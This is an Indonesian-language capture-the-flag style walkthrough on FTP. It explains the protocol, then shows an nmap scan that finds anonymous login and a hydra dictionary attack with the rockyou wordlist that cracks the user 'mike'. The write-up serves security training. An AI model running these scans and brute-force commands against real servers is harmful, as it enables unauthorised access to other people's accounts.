# Understanding FTP

FTP atau File Transfer Protocol merupakan protokol yang memungkinkan remote transfer file antar network. FTP menggunakan client-server model, dan menyampaikan data dan command secara efisien. Client akan menginisiasi connection dengan server, selanjutnya server akan memvalidasi login credentials yang ada dan membuka session, dan ketika session telah dibuka client dapat exec FTP command di server.

ada 2 tipikal FTP session yang biasa digunakan:

1. command/control channel
2. data channel

sesuai dengan namanya command/control channel digunakan untuk transmitting command dan juga menjawab command tersebut, sedangkan data channel digunakan untuk transfer data.

### Active vs Passive

FTP mungkin support active dan passsive connection, atau bahkan keduanya.

- di active FTP connection, client membuka port dan mendengarkan di port tersebut. Server diperlukan untuk secara aktif terkoneksi dengan port tersebut.
- di passive FTP connections, server membuka port dan mendengarkan di port tersebut (secara pasif) dan client terhubung ke port tersebut.

pemisahan command info dan data ke channel yang terpisah merupakan salah satu cara agar dapat mengirimkan command ke server tanpa harus menunggu transfer data selesai. Jika keduanya terhubung, kita hanya bisa memasukkan command diantara data transfers, yang mana sangat tidak efisien untuk data yang berukuran besar dan internet yang lambat.

# Enumerating FTP

Lakukan enumerasi menggunakan nmap.

```shell
sudo nmap <IP> -A -oN enumer
```

hasilnya kira-kira seperti berikut

```shell
...
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.38.153
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
...
```

ada 2 port yang terbuka yaitu port 21 & 80. Jenis FTP yang berjalan disini adalah `vsftpd`. selanjutnya kita dapat login ke FTP dengan cara 

```shell
ftp <IP>
```

setelah kita masuk, kita dapat melihat isi direktori dengan `ls`, jika ingin tau command apa saja yang dapat digunakan, kita dapat gunakan command `?`. Kita menemukan file bernama `PUBLIC_NOTICE.txt`, kita dapat melihat isi kontennya dengan menggunakan command `less` atau `more`, atau bisa juga kita download dengan command `mget`.

isi konten file tersebut:

```shell
===================================
MESSAGE FROM SYSTEM ADMINISTRATORS
===================================

Hello,

I hope everyone is aware that the
FTP server will not be available 
over the weekend- we will be 
carrying out routine system 
maintenance. Backups will be
made to my account so I reccomend
encrypting any sensitive data.

Cheers,

Mike
```

Potensial username atau user adalah **Mike**.

# Exploiting FTP

Sama dengan Telnet, ketika menggunakan FTP, command dan data channel tidak ter enkripsi. Data apapun yang dikirim melalui channel ini dapat di intercept dan dibaca oleh orang lain. Dari enumerasi yang sebelumnya dilakukan, kita mendapatkan informasi bahwa server ini memliki port FTP yang terbuka, FTP tersebut dapat dimasuki secara anonim, dan kita juga mendapat potential username yaitu `'Mike'`.

Untuk melakukan exploiting, kita dapat menggunakan metode brute-forcing dengan modal potential username tersebut. Metode brute-forcing yang digunakan disini adalah dengan menggunakan `hydra`.

```shell
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt <IP> ftp > cracked.txt
```

penjelasan:
- `-t 4` : jumlah task paralel yang dijalankan
- `-l mike` : nama user
- `-P /path/to/file.txt` : path dictionary password yang dimiliki
- `ftp` : service yang akan diserang
- `> cracked.txt` : hasil akan disimpan di file cracked.txt

hasil di cracked.txt

```shell
...
[DATA] attacking ftp://10.10.124.0:21/
[21][ftp] host: 10.10.124.0   login: mike   password: password
1 of 1 target successfully completed, 1 valid password found
...
```

selanjutnya kita dapat melakukan login ke FTP dengan username `'mike'` dan password `'password'`, dan kita lakukan `ls` untuk melihat isi direktori. Flag adalah ftp.txt, kita dapat menggunakan command `more ftp.txt` untuk melihat flagnya.
